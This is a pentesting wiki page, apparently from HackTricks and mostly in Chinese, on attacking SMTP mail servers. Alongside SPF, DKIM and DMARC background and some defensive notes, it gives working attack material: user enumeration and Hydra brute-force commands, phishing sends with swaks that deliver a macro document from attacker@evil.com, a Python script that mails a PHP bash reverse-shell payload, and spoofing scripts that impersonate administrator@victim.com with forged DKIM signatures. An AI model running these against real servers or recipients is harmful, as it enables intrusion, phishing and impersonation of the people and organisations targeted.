# 25,465,587 - Pentesting SMTP/s

{{#include ../../banners/hacktricks-training.md}}


## **基本信息**

**Simple Mail Transfer Protocol (SMTP)** 是 TCP/IP 套件中用于 **发送和接收电子邮件** 的协议。由于它在接收端对消息排队的限制，SMTP 通常与 **POP3 或 IMAP** 一起使用。这些附加协议使用户能够将邮件存储在服务器邮箱上并定期下载它们。

在实践中，**电子邮件程序** 通常使用 **SMTP 来发送电子邮件**，而在接收时使用 **POP3 或 IMAP**。在基于 Unix 的系统上，**sendmail** 是最常用于电子邮件的 SMTP 服务器。商业软件包 Sendmail 包含一个 POP3 服务器。此外，**Microsoft Exchange** 提供 SMTP 服务器，并可选择包含 POP3 支持。

**默认端口：** 25,465(ssl),587(ssl)
```
PORT   STATE SERVICE REASON  VERSION
25/tcp open  smtp    syn-ack Microsoft ESMTP 6.0.3790.3959
```
## Email Security Gateways (SEGs)

As mentioned in this [blog post](https://21ad.netlify.app/blogs/the-silent-inbox-how-verified-emails-slip-past-email-security-gateways/) **Secure Email Gateways (SEGs)** sit **in-line** with inbound mail flow by **changing MX records** to point to the SEG instead of the mail server. The SEG inspects inbound mail (e.g., IP reputation, blocklists, SPF checks, spoofing detection, metadata/content analysis, sandboxing, URL rewriting) and then forwards, drops, or quarantines messages based on policy. The security model assumes **all inbound mail reaches the SEG first**; if the mail server can be reached directly, the SEG can be **avoided** (similar to skipping a WAF by talking to the origin directly).

### Avoiding SEGs via MX mismatch

使用 Entra ID / Exchange Online 的组织通常有 **multiple accepted domains**。如果 **any accepted domain** 的 MX 记录 **points directly to the mail server**（例如 Exchange Online）而不是 SEG，则可以向该域投递邮件并 **avoid the SEG**。这是一种 **misconfiguration**（不是漏洞），但仍然是常见的缺口。

还需注意默认的 `<tenant>.onmicrosoft.com` 域：其 MX 记录始终指向 Exchange Online。如果对 `*.onmicrosoft.com` 的入站 **not locked down**，发送到 `user@<tenant>.onmicrosoft.com` 可能会直接进入收件箱，同时绕过 SEG。

**Defensive notes**:

- Lock down inbound to `*.onmicrosoft.com`.
- Regularly audit accepted domains and their MX routing.
- Configure mail servers to **only accept** inbound from the SEG.

### EMAIL Headers

如果你有机会**让受害者给你发一封 email**（例如通过网页的 contact form），就去做，因为通过查看邮件头你**可能会了解受害者的内部拓扑**。

你也可以通过让 SMTP server 尝试**向该服务器发送到一个不存在的地址的邮件**来获得一封邮件（因为服务器会向攻击者发送 NDN mail）。但要确保你是从被允许的地址发送邮件（检查 SPF policy），并且你能够接收 NDN 消息。

你还应该尝试**发送不同的内容，因为你可能在头部找到更有价值的信息**，例如：`X-Virus-Scanned: by av.domain.com`\
你应该发送 EICAR test file。\
检测到 **AV** 可能会让你利用 **known vulnerabilities**。

## Basic actions

### **Banner Grabbing/Basic connection**

**SMTP:**
```bash
nc -vn <IP> 25
```
**SMTPS**:
```bash
openssl s_client -crlf -connect smtp.mailgun.org:465 #SSL/TLS without starttls command
openssl s_client -starttls smtp -crlf -connect smtp.mailgun.org:587
```
### 查找组织的 MX 服务器
```bash
dig +short mx google.com
```
### 枚举
```bash
nmap -p25 --script smtp-commands 10.10.10.10
nmap -p25 --script smtp-open-relay 10.10.10.10 -v
```
### NTLM Auth - 信息泄露

如果服务器支持 NTLM auth (Windows)，你可以获取敏感信息（版本）。更多信息[**这里**](https://medium.com/@m8r0wn/internal-information-disclosure-using-hidden-ntlm-authentication-18de17675666).
```bash
root@kali: telnet example.com 587
220 example.com SMTP Server Banner
>> HELO
250 example.com Hello [x.x.x.x]
>> AUTH NTLM 334
NTLM supported
>> TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=
334 TlRMTVNTUAACAAAACgAKADgAAAAFgooCBqqVKFrKPCMAAAAAAAAAAEgASABCAAAABgOAJQAAAA9JAEkAUwAwADEAAgAKAEkASQBTADAAMQABAAoASQBJAFMAMAAxAAQACgBJAEkAUwAwADEAAwAKAEkASQBTADAAMQAHAAgAHwMI0VPy1QEAAAAA
```
或者使用 **nmap** 插件 `smtp-ntlm-info.nse` **自动化** 这个过程

### 内部服务器名称 - 信息泄露

某些 SMTP 服务器在未提供完整地址的情况下执行命令 "MAIL FROM" 时会自动补全发件人地址，从而泄露其内部名称：
```
220 somedomain.com Microsoft ESMTP MAIL Service, Version: Y.Y.Y.Y ready at  Wed, 15 Sep 2021 12:13:28 +0200
EHLO all
250-somedomain.com Hello [x.x.x.x]
250-TURN
250-SIZE 52428800
250-ETRN
250-PIPELINING
250-DSN
250-ENHANCEDSTATUSCODES
250-8bitmime
250-BINARYMIME
250-CHUNKING
250-VRFY
250 OK
MAIL FROM: me
250 2.1.0 me@PRODSERV01.somedomain.com....Sender OK
```
### Sniffing

检查是否能从发往端口 25 的数据包中 sniff 到密码

### [Auth bruteforce](../../generic-hacking/brute-force.md#smtp)

## 用户名 Bruteforce 枚举

**不一定需要身份验证**

### RCPT TO
```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO x
250 myhost Hello 18.28.38.48, pleased to meet you
MAIL FROM:example@domain.com
250 2.1.0 example@domain.com... Sender ok
RCPT TO:test
550 5.1.1 test... User unknown
RCPT TO:admin
550 5.1.1 admin... User unknown
RCPT TO:ed
250 2.1.5 ed... Recipient ok
```
### VRFY
```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
250 myhost Hello 18.28.38.48, pleased to meet you
VRFY root
250 Super-User root@myhost
VRFY blah
550 blah... User unknown
```
### EXPN
```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
EXPN test
550 5.1.1 test... User unknown
EXPN root
250 2.1.5 ed.williams@myhost
EXPN sshd
250 2.1.5 sshd privsep sshd@myhost
```
### 自动化工具
```
Metasploit: auxiliary/scanner/smtp/smtp_enum
smtp-user-enum: smtp-user-enum -M <MODE> -u <USER> -t <IP>
Nmap: nmap --script smtp-enum-users <IP>
```
## DSN 报告

**投递状态通知报告**: 如果你向某个组织发送一封**电子邮件**到一个**无效地址**，该组织会通过发送一封**退回的邮件**来通知该地址无效。返回邮件的**报头**会**包含**可能的**敏感信息**（例如与报告交互的邮件服务的 IP 地址或防病毒软件信息）。

## [Commands](smtp-commands.md)

### 从 linux 控制台 发送电子邮件
```bash
sendEmail -t to@domain.com -f from@attacker.com -s <ip smtp> -u "Important subject" -a /tmp/malware.pdf
Reading message body from STDIN because the '-m' option was not used.
If you are manually typing in a message:
- First line must be received within 60 seconds.
- End manual input with a CTRL-D on its own line.

<phishing message>
```

```bash
swaks --to $(cat emails | tr '\n' ',' | less) --from test@sneakymailer.htb --header "Subject: test" --body "please click here http://10.10.14.42/" --server 10.10.10.197
```
在使用 `swaks` 附加文件时，使用 `@` 前缀，这样文件字节会被嵌入，而不是作为字面文件名字符串。这对于传送包含宏的文档至关重要：
```bash
swaks --to hr@example.local --from attacker@evil.com --header "Subject: Resume" --body "Please review" --attach @resume.doc --server 10.0.0.5
```
### 使用 Python 发送电子邮件

<details>

<summary>这里的 Python 代码</summary>
```python
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import sys

lhost = "127.0.0.1"
lport = 443
rhost = "192.168.1.1"
rport = 25 # 489,587

# create message object instance
msg = MIMEMultipart()

# setup the parameters of the message
password = ""
msg['From'] = "attacker@local"
msg['To'] = "victim@local"
msg['Subject'] = "This is not a drill!"

# payload
message = ("<?php system('bash -i >& /dev/tcp/%s/%d 0>&1'); ?>" % (lhost,lport))

print("[*] Payload is generated : %s" % message)

msg.attach(MIMEText(message, 'plain'))
server = smtplib.SMTP(host=rhost,port=rport)

if server.noop()[0] != 250:
print("[-]Connection Error")
exit()

server.starttls()

# Uncomment if log-in with authencation
# server.login(msg['From'], password)

server.sendmail(msg['From'], msg['To'], msg.as_string())
server.quit()

print("[***]successfully sent email to %s:" % (msg['To']))
```
</details>

## SMTP Smuggling

SMTP Smuggling 漏洞允许绕过所有 SMTP 保护（关于保护的更多信息请查看下一节）。有关 SMTP Smuggling 的更多信息，请参见：

{{#ref}}
smtp-smuggling.md
{{#endref}}

## Mail Spoofing Countermeasures

由于 SMTP 消息容易被伪造，组织通过部署 **SPF**, **DKIM**, 和 **DMARC** 来防止未授权的邮件以其名义发送。

关于这些对策的**完整指南**可见 [https://seanthegeek.net/459/demystifying-dmarc/](https://seanthegeek.net/459/demystifying-dmarc/)。

### SPF

> [!CAUTION]
> SPF [was "deprecated" in 2014](https://aws.amazon.com/premiumsupport/knowledge-center/route53-spf-record/)。这意味着与其在 `_spf.domain.com` 中创建一个 **TXT record**，你应当在 `domain.com` 中使用**相同的语法**来创建它。\
> 此外，为了重用先前的 spf 记录，通常会看到类似 `"v=spf1 include:_spf.google.com ~all"` 这样的写法

**Sender Policy Framework** (SPF) 是一种机制，允许 Mail Transfer Agents (MTAs) 通过查询组织定义的授权邮件服务器列表来验证发送邮件的主机是否被授权。该列表指定了 IP 地址/范围、域名及其他被**授权代表某一域名发送电子邮件**的实体，SPF 记录中包含多种“**机制**”。

#### 机制

摘自 [Wikipedia](https://en.wikipedia.org/wiki/Sender_Policy_Framework):

| 机制      | 说明                                                                                                                                                                                                                                                                                                                              |
| --------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| ALL       | 始终匹配；用于默认结果，例如对所有未被前置机制匹配的 IP 使用 `-all`。                                                                                                                                                                                                                                                            |
| A         | 如果域名具有可以解析到发送者地址的地址记录（A 或 AAAA），则匹配。                                                                                                                                                                                                                                                              |
| IP4       | 如果发送者位于指定的 IPv4 地址范围内，则匹配。                                                                                                                                                                                                                                                                                 |
| IP6       | 如果发送者位于指定的 IPv6 地址范围内，则匹配。                                                                                                                                                                                                                                                                                 |
| MX        | 如果域名的 MX 记录解析到发送者地址，则匹配（即邮件来自该域的一台入站邮件服务器）。                                                                                                                                                                                                                                               |
| PTR       | 如果客户端地址的域名（PTR 记录）位于给定域内，且该域名可以解析回客户端地址（正向确认的反向 DNS），则匹配。此机制不推荐使用，应尽量避免。                                                                                                                                                                                          |
| EXISTS    | 如果给定域名解析到任意地址，则匹配（不论解析到哪个地址）。此项很少使用。结合 SPF 宏语言，它可提供更复杂的匹配，例如 DNSBL 查询。                                                                                                                                                                                               |
| INCLUDE   | 引用另一个域的策略。如果被引用域的策略通过，则该机制通过；但如果被引用策略失败，处理将继续。若要完全委托给另一个域的策略，必须使用 redirect 扩展。                                                                                                                                                                         |
| REDIRECT  | <p>redirect 是指向托管 SPF 策略的另一个域名的指针，它允许多个域共享相同的 SPF 策略。在处理大量共享相同邮件基础设施的域时非常有用。</p><p>将使用 redirect 机制中指定域的 SPF 策略。</p> |

还可以定义**限定符（Qualifiers）**，用于指示**当某个机制被匹配时应采取的动作**。默认使用的限定符是 **`+`**（因此任何机制被匹配时即表示被允许）。\
通常在每个 SPF 策略的末尾会看到类似 **`~all`** 或 **`-all`** 的条目。它们用于指示**如果发送方不符合任何 SPF 策略，应将邮件标记为不可信（`~`）或直接拒绝（`-`）**。

#### 限定符

每个机制前可以加上四种限定符之一来定义预期结果：

- **`+`**：对应 PASS 结果。默认情况下，机制假定此限定符，因此 `+mx` 等同于 `mx`。
- **`?`**：表示 NEUTRAL 结果，类似于 NONE（无特定策略）。
- **`~`**：表示 SOFTFAIL，介于 NEUTRAL 和 FAIL 之间。符合该结果的邮件通常会被接受但被标记。
- **`-`**：表示 FAIL，意味着应直接拒绝该邮件。

在下面的示例中，展示了 **SPF policy of google.com**。注意第一个 SPF 策略中包含了来自不同域的 SPF 策略：
```shell-session
dig txt google.com | grep spf
google.com.             235     IN      TXT     "v=spf1 include:_spf.google.com ~all"

dig txt _spf.google.com | grep spf
; <<>> DiG 9.11.3-1ubuntu1.7-Ubuntu <<>> txt _spf.google.com
;_spf.google.com.               IN      TXT
_spf.google.com.        235     IN      TXT     "v=spf1 include:_netblocks.google.com include:_netblocks2.google.com include:_netblocks3.google.com ~all"

dig txt _netblocks.google.com | grep spf
_netblocks.google.com.  1606    IN      TXT     "v=spf1 ip4:35.190.247.0/24 ip4:64.233.160.0/19 ip4:66.102.0.0/20 ip4:66.249.80.0/20 ip4:72.14.192.0/18 ip4:74.125.0.0/16 ip4:108.177.8.0/21 ip4:173.194.0.0/16 ip4:209.85.128.0/17 ip4:216.58.192.0/19 ip4:216.239.32.0/19 ~all"

dig txt _netblocks2.google.com | grep spf
_netblocks2.google.com. 1908    IN      TXT     "v=spf1 ip6:2001:4860:4000::/36 ip6:2404:6800:4000::/36 ip6:2607:f8b0:4000::/36 ip6:2800:3f0:4000::/36 ip6:2a00:1450:4000::/36 ip6:2c0f:fb50:4000::/36 ~all"

dig txt _netblocks3.google.com | grep spf
_netblocks3.google.com. 1903    IN      TXT     "v=spf1 ip4:172.217.0.0/19 ip4:172.217.32.0/20 ip4:172.217.128.0/19 ip4:172.217.160.0/20 ip4:172.217.192.0/19 ip4:172.253.56.0/21 ip4:172.253.112.0/20 ip4:108.177.96.0/19 ip4:35.191.0.0/16 ip4:130.211.0.0/22 ~all"
```
传统上，如果某个域名没有正确的 SPF 记录或根本没有 SPF 记录，就可以伪造该域名。**如今**，如果**电子邮件**来自**没有有效 SPF 记录的域**，通常会被**自动拒绝/标记为不可信**。

要检查域的 SPF，可以使用在线工具，例如： [https://www.kitterman.com/spf/validate.html](https://www.kitterman.com/spf/validate.html)

### DKIM (DomainKeys Identified Mail)

DKIM 用于对外发电子邮件进行签名，使外部 Mail Transfer Agents (MTAs) 能通过从 DNS 获取域的公钥来验证邮件。该公钥位于域的 TXT 记录中。要访问此密钥，需要知道 selector 和 域名。

例如，请求该密钥时，域名和 selector 是必需的。这些可以在邮件头 `DKIM-Signature` 中找到，例如，`d=gmail.com;s=20120113`。

用于获取该信息的命令示例如下：
```bash
dig 20120113._domainkey.gmail.com TXT | grep p=
# This command would return something like:
20120113._domainkey.gmail.com. 280 IN   TXT    "k=rsa\; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1Kd87/UeJjenpabgbFwh+eBCsSTrqmwIYYvywlbhbqoo2DymndFkbjOVIPIldNs/m40KF+yzMn1skyoxcTUGCQs8g3
```
### DMARC (基于域的消息认证、报告与一致性)

DMARC 在 SPF 和 DKIM 协议的基础上增强了电子邮件安全。它定义了策略，指导邮件服务器如何处理来自特定域的邮件，包括如何处理认证失败以及将关于邮件处理操作的报告发送到何处。

**要获取 DMARC 记录，需要查询子域 \_dmarc**
```bash
# Reject
dig _dmarc.facebook.com txt | grep DMARC
_dmarc.facebook.com.	3600	IN	TXT	"v=DMARC1; p=reject; rua=mailto:a@dmarc.facebookmail.com; ruf=mailto:fb-dmarc@datafeeds.phishlabs.com; pct=100"

# Quarantine
dig _dmarc.google.com txt | grep DMARC
_dmarc.google.com.	300	IN	TXT	"v=DMARC1; p=quarantine; rua=mailto:mailauth-reports@google.com"

# None
dig _dmarc.bing.com txt | grep DMARC
_dmarc.bing.com.	3600	IN	TXT	"v=DMARC1; p=none; pct=100; rua=mailto:BingEmailDMARC@microsoft.com;"
```
#### DMARC 标签

| 标签名称 | 作用                                       | 示例                          |
| -------- | --------------------------------------------- | ------------------------------- |
| v        | 协议版本                                     | v=DMARC1                        |
| pct      | 受过滤的邮件百分比                             | pct=20                          |
| ruf      | 取证报告的上报 URI                            | ruf=mailto:authfail@example.com |
| rua      | 聚合报告的上报 URI                            | rua=mailto:aggrep@example.com   |
| p        | 组织域的策略                                  | p=quarantine                    |
| sp       | 子域的策略                                    | sp=reject                       |
| adkim    | DKIM 的对齐模式                               | adkim=s                         |
| aspf     | SPF 的对齐模式                                | aspf=r                          |

### **关于子域名？**

**摘自** [**here**](https://serverfault.com/questions/322949/do-spf-records-for-primary-domain-apply-to-subdomains)**.**\
如果你想从某个子域发送邮件，需要为每个子域设置单独的 SPF 记录。\
下面内容最初发布于 openspf.org，曾经是这类信息的优秀资源。

> 魔鬼问题：子域名怎么办？
>
> 如果我收到来自 pielovers.demon.co.uk 的邮件，而 pielovers 没有 SPF 数据，我是否应该退一级去测试 demon.co.uk 的 SPF？不应该。Demon 的每个子域都是不同的客户，每个客户可能有自己的策略。让 Demon's 策略默认适用于其所有客户没有意义；如果 Demon 想那样做，它可以为每个子域设置 SPF 记录。
>
> 因此给 SPF 发布者的建议是：你应该为每个有 A or MX record 的子域或主机名添加 SPF 记录。
>
> 对于有通配符 A or MX records 的网站，也应该有通配符 SPF 记录，格式如下： \* IN TXT "v=spf1 -all"

这很有道理——子域可能位于不同的地理位置，并且有非常不同的 SPF 定义。

### **开放中继 (Open Relay)**

发送邮件时，确保它们不会被标记为垃圾邮件至关重要。通常通过使用一个被收件方信任的**中继服务器 (relay server)** 来实现。然而，一个常见的问题是管理员可能并不完全清楚哪些**IP 范围是安全允许的**。这种缺乏了解可能导致在配置 SMTP 服务器 时发生错误，这也是安全评估中经常发现的风险。

为避免邮件投递问题，特别是在与潜在或现有客户沟通时，一些管理员采用的变通办法是**允许来自任意 IP 地址的连接**。这是通过将 SMTP 服务器的 `mynetworks` 参数配置为接受所有 IP 地址来实现的，如下所示：
```bash
mynetworks = 0.0.0.0/0
```
要检查邮件服务器是否为 open relay（这意味着它可以从任何外部来源转发电子邮件），通常使用 `nmap` 工具。它包含一个专门用于测试此项的脚本。使用 `nmap` 在端口 25 对服务器（例如 IP 为 10.10.10.10）进行详细扫描的命令是：
```bash
nmap -p25 --script smtp-open-relay 10.10.10.10 -v
```
### **工具**

- [**https://github.com/serain/mailspoof**](https://github.com/serain/mailspoof) **检查 SPF 和 DMARC 的错误配置**
- [**https://pypi.org/project/checkdmarc/**](https://pypi.org/project/checkdmarc/) **自动获取 SPF 和 DMARC 配置**

### 发送 Spoof 邮件

- [**https://www.mailsploit.com/index**](https://www.mailsploit.com/index)
- [**http://www.anonymailer.net/**](http://www.anonymailer.net)
- [**https://emkei.cz/**](https://emkei.cz/)

**或者你可以使用以下工具：**

- [**https://github.com/magichk/magicspoofing**](https://github.com/magichk/magicspoofing)
```bash
# This will send a test email from test@victim.com to destination@gmail.com
python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com
# But you can also modify more options of the email
python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com --subject TEST --sender administrator@victim.com
```
> [!WARNING]
> 如果你在 **dkim python lib 中解析密钥时遇到任何错误**，可以使用下面提供的密钥。\
> **注意**：这只是一个临时的简易修复，用于在某些情况下 openssl 私钥 **无法被 dkim 解析** 时进行快速检查。
>
> ```
> -----BEGIN RSA PRIVATE KEY-----
> MIICXgIBAAKBgQDdkohAIWT6mXiHpfAHF8bv2vHTDboN2dl5pZKG5ZSHCYC5Z1bt
> spr6chlrPUX71hfSkk8WxnJ1iC9Moa9sRzdjBrxPMjRDgP8p8AFdpugP5rJJXExO
> pkZcdNPvCXGYNYD86Gpous6ubn6KhUWwDD1bw2UFu53nW/AK/EE4/jeraQIDAQAB
> AoGAe31lrsht7TWH9aJISsu3torCaKyn23xlNuVO6xwdUb28Hpk327bFpXveKuS1
> koxaLqQYrEriFBtYsU8T5Dc06FQAVLpUBOn+9PcKlxPBCLvUF+/KbfHF0q1QbeZR
> fgr+E+fPxwVPxxk3i1AwCP4Cp1+bz2s58wZXlDBkWZ2YJwECQQD/f4bO2lnJz9Mq
> 1xsL3PqHlzIKh+W+yiGmQAELbgOdX4uCxMxjs5lwGSACMH2nUwXx+05RB8EM2m+j
> ZBTeqxDxAkEA3gHyUtVenuTGClgYpiwefaTbGfYadh0z2KmiVcRqWzz3hDUEWxhc
> GNtFT8wzLcmRHB4SQYUaS0Df9mpvwvdB+QJBALGv9Qci39L0j/15P7wOYMWvpwOf
> 422+kYxXcuKKDkWCTzoQt7yXCRzmvFYJdznJCZdymNLNu7q+p2lQjxsUiWECQQCI
> Ms2FP91ywYs1oWJN39c84byBKtiFCdla3Ib48y0EmFyJQTVQ5ZrqrOrSz8W+G2Do
> zRIKHCxLapt7w0SZabORAkEAxvm5pd2MNVqrqMJHbukHY1yBqwm5zVIYr75eiIDP
> K9B7U1w0CJFUk6+4Qutr2ROqKtNOff9KuNRLAOiAzH3ZbQ==
> -----END RSA PRIVATE KEY-----
> ```
>
> **或者你可以手动执行：**
>
> {{#tabs}}
> {{#tab name="PHP"}}
> 
> <pre class="language-php"><code class="lang-php"><strong># This will send an unsigned message
> </strong><strong>mail("your_email@gmail.com", "Test Subject!", "hey! This is a test", "From: administrator@victim.com");
> </strong></code></pre>
> 
> {{#endtab}}
> 
> {{#tab name="Python"}}
```python
# Code from https://github.com/magichk/magicspoofing/blob/main/magicspoofmail.py

import os
import dkim #pip3 install dkimpy
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase

# Set params
destination="destination@gmail.com"
sender="administrator@victim.com"
subject="Test"
message_html="""
<html>
<body>
<h3>This is a test, not a scam</h3>
<br />
</body>
</html>
"""
sender_domain=sender.split("@")[1]

# Prepare postfix
os.system("sudo sed -ri 's/(myhostname) = (.*)/\\1 = "+sender_domain+"/g' /etc/postfix/main.cf")
os.system("systemctl restart postfix")

# Generate DKIM keys
dkim_private_key_path="dkimprivatekey.pem"
os.system(f"openssl genrsa -out {dkim_private_key_path} 1024 2> /dev/null")
with open(dkim_private_key_path) as fh:
dkim_private_key = fh.read()

# Generate email
msg = MIMEMultipart("alternative")
msg.attach(MIMEText(message_html, "html"))
msg["To"] = destination
msg["From"] = sender
msg["Subject"] = subject
headers = [b"To", b"From", b"Subject"]
msg_data = msg.as_bytes()

# Sign email with dkim
## The receiver won't be able to check it, but the email will appear as signed (and therefore, more trusted)
dkim_selector="s1"
sig = dkim.sign(message=msg_data,selector=str(dkim_selector).encode(),domain=sender_domain.encode(),privkey=dkim_private_key.encode(),include_headers=headers)
msg["DKIM-Signature"] = sig[len("DKIM-Signature: ") :].decode()
msg_data = msg.as_bytes()

# Use local postfix relay to send email
smtp="127.0.0.1"
s = smtplib.SMTP(smtp)
s.sendmail(sender, [destination], msg_data)
```
{{#endtab}}
{{#endtabs}}

### **更多信息**

**关于这些防护的更多信息，请参见** [**https://seanthegeek.net/459/demystifying-dmarc/**](https://seanthegeek.net/459/demystifying-dmarc/)

### **其他 phishing 指示器**

- 域名年龄
- Links 指向 IP 地址
- Link 操作技巧
- 可疑（不常见的）附件
- 邮件内容异常
- 使用的值与邮件头中的值不同
- 存在有效且受信任的 SSL 证书
- 将页面提交到 Web 内容过滤站点

## Exfiltration through SMTP

**如果你可以通过 SMTP 发送数据** [**read this**](../../generic-hacking/exfiltration.md#smtp)**.**

## 配置文件

### Postfix

通常，如果已安装，`/etc/postfix/master.cf` 包含在用户接收到新邮件时要执行的 **脚本**。例如，行 `flags=Rq user=mark argv=/etc/postfix/filtering-f ${sender} -- ${recipient}` 意味着当用户 mark 收到新邮件时将执行 `/etc/postfix/filtering`。

其他配置文件:
```
sendmail.cf
submit.cf
```
## 参考资料

- [https://research.nccgroup.com/2015/06/10/username-enumeration-techniques-and-their-value/](https://research.nccgroup.com/2015/06/10/username-enumeration-techniques-and-their-value/)
- [https://www.reddit.com/r/HowToHack/comments/101it4u/what_could_hacker_do_with_misconfigured_smtp/](https://www.reddit.com/r/HowToHack/comments/101it4u/what_could_hacker_do_with_misconfigured_smtp/)
- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- <https://21ad.netlify.app/blogs/the-silent-inbox-how-verified-emails-slip-past-email-security-gateways/>

## HackTricks 自动命令
```
Protocol_Name: SMTP    #Protocol Abbreviation if there is one.
Port_Number:  25,465,587     #Comma separated if there is more than one.
Protocol_Description: Simple Mail Transfer Protocol          #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for SMTP
Note: |
SMTP (Simple Mail Transfer Protocol) is a TCP/IP protocol used in sending and receiving e-mail. However, since it is limited in its ability to queue messages at the receiving end, it is usually used with one of two other protocols, POP3 or IMAP, that let the user save messages in a server mailbox and download them periodically from the server.

https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smtp/index.html

Entry_2:
Name: Banner Grab
Description: Grab SMTP Banner
Command: nc -vn {IP} 25

Entry_3:
Name: SMTP Vuln Scan
Description: SMTP Vuln Scan With Nmap
Command: nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 {IP}

Entry_4:
Name: SMTP User Enum
Description: Enumerate uses with smtp-user-enum
Command: smtp-user-enum -M VRFY -U {Big_Userlist} -t {IP}

Entry_5:
Name: SMTPS Connect
Description: Attempt to connect to SMTPS two different ways
Command: openssl s_client -crlf -connect {IP}:465 &&&& openssl s_client -starttls smtp -crlf -connect {IP}:587

Entry_6:
Name: Find MX Servers
Description: Find MX servers of an organization
Command: dig +short mx {Domain_Name}

Entry_7:
Name: Hydra Brute Force
Description: Need Nothing
Command: hydra -P {Big_Passwordlist} {IP} smtp -V

Entry_8:
Name: consolesless mfs enumeration
Description: SMTP enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_version; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_ntlm_domain; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_relay; set RHOSTS {IP}; set RPORT 25; run; exit'

```
{{#include ../../banners/hacktricks-training.md}}
